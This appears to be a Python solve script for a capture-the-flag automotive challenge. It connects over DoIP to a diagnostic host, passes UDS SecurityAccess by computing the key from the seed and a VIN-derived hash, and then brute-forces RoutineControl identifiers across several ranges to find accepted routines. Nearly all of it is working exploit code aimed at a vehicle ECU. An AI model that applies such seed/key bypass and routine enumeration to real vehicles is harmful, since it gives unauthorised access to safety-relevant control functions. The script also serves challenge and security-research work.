import sys, json, hashlib, struct, socket, time
sys.path.insert(0,"04_SOLVE/uds")
from solve_task04 import hash8, C_DEV
H=lambda t,p: bytes([0x02,0xFD])+struct.pack(">H",t)+struct.pack(">I",len(p))+p
HOST,PORT="10.226.193.2",13400; SA=0x0E00; TA=0xE442
T=json.load(open("work/t5/ticket.json"))["diagnosticTicket"]
VIN=b"CV622697F82A936A1"
def rp(s):
    hdr=b""
    while len(hdr)<8:
        c=s.recv(8-len(hdr))
        if not c: return None
        hdr+=c
    v,i,pt,ln=struct.unpack(">BBHI",hdr); pl=b""
    while len(pl)<ln:
        c=s.recv(ln-len(pl))
        if not c: break
        pl+=c
    return pt,pl
def open_unlocked():
    s=socket.socket(); s.settimeout(4); s.connect((HOST,PORT))
    s.sendall(H(0x0005,struct.pack(">H",SA)+b"\x00"+b"\x00"*4)); rp(s)
    def diag(p):
        s.sendall(H(0x8001,struct.pack(">H",SA)+struct.pack(">H",TA)+p))
        r=rp(s)
        return r[1][4:].hex() if r and r[0]==0x8001 and len(r[1])>=5 else ""
    diag(bytes.fromhex("1003")); diag(bytes.fromhex("2EF1A1")+T.encode())
    sd=diag(bytes.fromhex("2701")); seed=bytes.fromhex(sd[4:])
    key=hash8(seed, hashlib.sha256(VIN).digest()[:8], C_DEV)
    u=diag(bytes.fromhex("2702")+key)
    assert u.startswith("6702"), f"unlock failed {u}"
    return s, diag, key

s,diag,key=open_unlocked()
print("unlocked OK")
# 严格单发对比：先验证 diag 单发可靠
print("sanity 22F1A3:", diag(bytes.fromhex("22F1A3")))
print("sanity 3101FF00:", diag(bytes.fromhex("3101FF00")))

ranges=[(0x0000,0x0200),(0xE000,0xE200),(0xF000,0xFFFF)]
hits=[]
t0=time.time()
for lo,hi in ranges:
    for rid in range(lo,hi+1):
        r=diag(bytes([0x31,0x01])+struct.pack(">H",rid))
        if not r.startswith("7f3131"):
            hits.append((rid,r)); print(f"  *** 31 01 {rid:#06x} -> {r}",flush=True)
    print(f"  done {lo:#06x}-{hi:#06x} ({time.time()-t0:.0f}s)",flush=True)
s.close()
print("hits:",hits)
